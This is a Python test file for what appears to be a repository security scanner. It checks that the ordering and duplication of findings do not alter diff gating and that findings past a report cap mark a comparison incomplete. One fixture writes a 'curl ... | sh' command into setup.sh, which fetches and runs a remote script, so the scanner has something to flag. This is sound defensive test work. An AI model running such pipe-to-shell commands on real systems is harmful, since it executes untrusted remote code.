"""Occurrence ordering cannot change a gate when the finding multiset is identical."""

from dataclasses import replace
from itertools import permutations
from pathlib import Path

from repovet.comparison import DiffStatus, compare_findings, diff_exit_code
from repovet.identity import fingerprint
from repovet.models import Confidence, Finding, Location, Severity


def same_position() -> Finding:
    finding = Finding(
        rule_id="RC-DLX-001",
        title="Dummy command",
        category="danger",
        area="download_exec",
        severity=Severity.HIGH,
        confidence=Confidence.HIGH,
        location=Location("script.sh", 12, 1),
        message="Dummy finding",
        evidence="echo DUMMY",
        rationale="Review the command",
        recommendation="Read its source",
    )
    return replace(finding, fingerprint=fingerprint(finding))


def test_same_position_severity_and_confidence_order_is_not_a_promotion() -> None:
    finding = same_position()
    before = [
        finding,
        replace(finding, severity=Severity.LOW),
        replace(finding, confidence=Confidence.LOW),
        replace(finding, severity=Severity.LOW, confidence=Confidence.LOW),
    ]
    expected = compare_findings(before, before)
    for order in permutations(before):
        result = compare_findings(before, order)
        assert result == expected
        assert len(result.changes) == len(before)
        assert all(change.status is DiffStatus.UNCHANGED for change in result.changes)
        assert diff_exit_code(result, Severity.INFO) == 0


def test_identical_occurrence_duplicates_keep_multiplicity_without_new_funds() -> None:
    finding = same_position()
    low = replace(finding, severity=Severity.LOW)
    before = [finding, low, finding, low]
    after = [low, finding, low, finding]
    result = compare_findings(before, after)
    assert len(result.changes) == 4
    assert not result.incomplete
    assert all(change.status is DiffStatus.UNCHANGED for change in result.changes)
    assert diff_exit_code(result, Severity.LOW) == 0


def test_new_finding_beyond_report_cap_is_an_incomplete_comparison(tmp_path: Path) -> None:
    from repovet.comparison import ComparisonScope
    from repovet.scanning import ScanOptions, scan_local

    root = tmp_path / "repo"
    root.mkdir()
    script = root / "setup.sh"
    command = "curl -s https://example.invalid/i.sh | sh\n"
    script.write_text(command * 5, encoding="utf-8")
    before = scan_local(ScanOptions(str(root), offline=True)).result
    script.write_text(command * 6, encoding="utf-8")
    after = scan_local(ScanOptions(str(root), offline=True)).result
    scope = ComparisonScope(
        {"setup.sh": "base"}, {"setup.sh": "head"}, before.coverage, after.coverage
    )
    result = compare_findings(before.findings, after.findings, scope)
    assert diff_exit_code(result, Severity.MEDIUM) == 3
